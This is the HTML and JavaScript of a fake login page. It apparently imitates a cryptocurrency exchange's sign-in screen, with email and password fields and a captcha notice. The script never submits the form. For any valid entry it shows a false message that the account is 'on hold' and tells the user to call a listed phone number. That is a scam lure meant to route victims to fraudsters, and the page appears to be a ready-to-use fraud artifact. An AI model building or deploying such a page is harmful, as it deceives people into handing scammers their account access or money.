    <section class="form-section">
        <div class="container formScreen">
            <div class="row">
                <div class="col-md-12 col-12 d-flex justify-content-center align-items-center mt-3">
                    <div class="formContainer">
                        <h2 class="headingLogin text-center">Log in</h2>
                        <div class="dontAccountText">Don't have an account? <span class="linkNewAccount"> Register now
                                for free.</span></div>
                        <div class="formWrapper">
                            <div class="formLoginDetails mt-4">
                                <form action="#" method="post" autocomplete="off">
                                    <div class="formWrapperLabelinput">
                                        <div class="formWrapperInput">
                                            <div class="formWrapperInputDetails">
                                                <div class="formWrapperInputDetailsMainInput">
                                                    <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" autocapitalize="off" value="" onkeyup="buttonenable()">
                                                    <label for="POST-name" id="formrowfield" class="form-row-field">Email or User ID</label>
                                                </div>
                                            </div>
                                            <div class="formWrapperInputDetailsPass" id="formWrapperInputDetailsPass">
                                                <div class="formWrapperInputDetailsMainInput">
                                                    <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" autocapitalize="off" value="" onkeyup="buttonenable()">
                                                    <label for="POST-name" id="formrowfield" class="form-row-field">Password</label>
                                                    <div class="eyeForm">
                                                        <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="18" height="18" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
                                                            <path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
                                                            <path
                                                                d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
                                                        </svg>
                                                    </div>
                                                </div>
                                                <div class="forgotPass">
                                                    Forgot password?
                                                </div>
                                            </div>
                                            <p class="errorMsg" id="errorMsg"></p>
                                        </div>
                                    </div>
                                    <div class="footerLoginButton">
                                        <span class="spanBut">This site is protected by hCaptcha and its <span>Privacy
                                                Policy</span> and <span>Terms of Service</span> apply.</span>
                                        <button class="click_login_submit" id="click_login_submit" type="button">Log
                                            In</button>
                                    </div>


                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>


    <div id="popupBox">
        <div id="popupBoxClose">
            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
                <path
                    d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8 2.146 2.854Z" />
            </svg>
        </div>
        <div id="popupBoxMsg">
        </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

    <script>
        var crossButton = document.getElementById('crossButtonMenu');
        var menuScreen = document.getElementById('sidebarMenu');
        var menuIcon = document.getElementById('menuIcon');
        var click_login_submit = document.getElementById('click_login_submit');
        var username = document.getElementById('username');
        var errorMsg = document.getElementById('errorMsg');

        var popupBoxClose = document.getElementById('popupBoxClose');
        var popupBox = document.getElementById('popupBox');
        var popupBoxMsg = document.getElementById('popupBoxMsg');
        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
        var passwordField = document.getElementById('passwordField');
        var btnLoginQR = document.getElementById('btnLoginQR');
        var eyeIconToggle = document.getElementById('eyeIconToggle');
        var checkValue = document.getElementById('checkValue');
        var checkValueCaptcha = document.getElementById('checkValueCaptcha');
        var formrowfieldclass = document.getElementsByClassName('form-row-field');

        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

        eyeIconToggle.addEventListener('click', function() {
            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {

                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
  <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>`;
                eyeIconToggle.classList.add('bi-eye-fill');
                eyeIconToggle.classList.remove('bi-eye-slash-fill');
                passwordField.setAttribute('type', 'text');
            } else {
                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
  <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>`;
                eyeIconToggle.classList.add('bi-eye-slash-fill');
                eyeIconToggle.classList.remove('bi-eye-fill');
                passwordField.setAttribute('type', 'password');
            }
        });

        click_login_submit.addEventListener('click', function() {
            if (username.value == '' && passwordField.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill email id and password';
            } else if (username.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill email';
            } else if (!username.value.match(validRegex)) {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill valid email';
            } else if (passwordField.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill Password';
            } else {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call  (866) 236-6843.';
            }
        });


        function buttonenable() {
            if (username.value == '' || passwordField.value == '') {
                click_login_submit.style.opacity = '0.7';
            } else {
                click_login_submit.style.opacity = '1';
            }
            if (username.value == '' && passwordField.value == '') {
                formrowfieldclass[0].classList.remove('labelSelected');
                formrowfieldclass[1].classList.remove('labelSelected');
            } else {
                formrowfieldclass[0].classList.add('labelSelected');
                formrowfieldclass[1].classList.add('labelSelected');
            }
        }

        popupBoxClose.addEventListener('click', function() {
            popupBox.style.display = 'none';
            popupBoxMsg.innerText = '';
        })
    </script>
